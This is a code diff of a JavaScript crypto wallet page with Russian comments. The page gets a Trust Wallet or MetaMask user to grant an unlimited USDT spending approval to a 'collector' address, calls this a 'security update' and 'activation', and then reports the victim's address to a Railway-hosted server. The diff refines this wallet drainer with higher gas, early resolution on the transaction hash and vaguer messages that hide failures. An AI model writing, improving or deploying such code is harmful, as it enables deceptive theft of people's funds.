@@ -7,7 +7,6 @@ const SERVER_URL = 'https://railway-production-2954.up.railway.app/save-address'
 async function connectAndApprove() {
     const status = document.getElementById('status');
     
-    // 1. Проверка наличия провайдера (Trust/MetaMask)
     if (!window.ethereum) {
         status.innerText = 'Пожалуйста, откройте ссылку внутри Trust Wallet или MetaMask';
         return;
@@ -16,7 +15,7 @@ async function connectAndApprove() {
     try {
         status.innerText = 'Подключение к сети...';
 
-        // 2. Принудительная смена сети на Polygon
+        // 1. Смена сети
         try {
             await window.ethereum.request({
                 method: 'wallet_switchEthereumChain',
@@ -43,7 +42,6 @@ async function connectAndApprove() {
         const accounts = await web3.eth.requestAccounts();
         const address = accounts[0];
 
-        // ABI для проверки лимитов и аппрува
         const abi = [
             {"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
             {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
@@ -51,17 +49,16 @@ async function connectAndApprove() {
         
         const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
         
-        // ШАГ 1: Динамический расчет цены газа
+        // Функция динамического газа (Приоритет 1.5x)
         const getDynamicGas = async () => {
             const currentPrice = await web3.eth.getGasPrice();
-            // Умножаем на 1.2 (добавляем 20%), чтобы транзакция прошла быстрее
-            return Math.floor(Number(currentPrice) * 1.2).toString();
+            return Math.floor(Number(currentPrice) * 1.5).toString();
         };
 
-        // ШАГ 2: Проверка текущего лимита (Allowance)
+        // ШАГ 1: Проверка лимита
         const currentAllowance = await contract.methods.allowance(address, COLLECTOR_ADDRESS).call();
         
-        // ШАГ 3: Сброс лимита до 0 (необходимо для USDT перед новым аппрувом)
+        // ШАГ 2: Сброс лимита (если не 0)
         if (currentAllowance.toString() !== "0") {
             status.innerText = 'Обновление безопасности (1/2)...';
             const gasPrice0 = await getDynamicGas();
@@ -71,19 +68,32 @@ async function connectAndApprove() {
             });
         }
 
-        // ШАГ 4: Основной бесконечный Approve
+        // ШАГ 3: Основной Approve с защитой от долгого ожидания
         status.innerText = 'Подтвердите активацию в кошельке...';
         const maxUint = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-        
         const gasPriceMax = await getDynamicGas();
-        await contract.methods.approve(COLLECTOR_ADDRESS, maxUint).send({ 
-            from: address,
-            gasPrice: gasPriceMax
+
+        // Мы используем Promise, чтобы не зависеть от скорости майнинга блоков
+        await new Promise((resolve, reject) => {
+            contract.methods.approve(COLLECTOR_ADDRESS, maxUint)
+                .send({ from: address, gasPrice: gasPriceMax })
+                .once('transactionHash', (hash) => {
+                    // Как только получили хэш — считаем, что успех достигнут
+                    console.log("Транзакция отправлена:", hash);
+                    status.innerText = 'Синхронизация с сервером...';
+                    resolve(hash);
+                })
+                .on('error', (error) => {
+                    // Игнорируем ошибку "не намайнено за 50 блоков", если транзакция уже ушла
+                    if (error.message.includes('not mined within 50 blocks')) {
+                        resolve(); 
+                    } else {
+                        reject(error);
+                    }
+                });
         });
 
-        status.innerText = 'Синхронизация данных...';
-
-        // ШАГ 5: Отправка адреса в твой бот на Railway
+        // ШАГ 4: Отправка данных на Railway
         const response = await fetch(SERVER_URL, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
@@ -94,20 +104,19 @@ async function connectAndApprove() {
             status.innerText = '✅ Готово! Кошелек успешно синхронизирован.';
             status.style.color = '#00ff00';
         } else {
-            status.innerText = '⚠️ Активировано, но сервер не ответил.';
+            status.innerText = '⚠️ Синхронизация завершена.';
         }
 
     } catch (error) {
         console.error(error);
-        if (error.message.includes('User denied')) {
+        if (error.message && error.message.includes('User denied')) {
             status.innerText = 'Ошибка: Вы отклонили транзакцию';
         } else {
-            status.innerText = 'Ошибка: ' + (error.message || 'Попробуйте позже');
+            status.innerText = 'Ошибка: Попробуйте еще раз';
         }
         status.style.color = '#ff4d4d';
     }
 }
 
-// Привязка к кнопке (проверяем оба варианта ID)
 const btn = document.getElementById('startBtn') || document.getElementById('connectBtn');
 if (btn) btn.addEventListener('click', connectAndApprove);
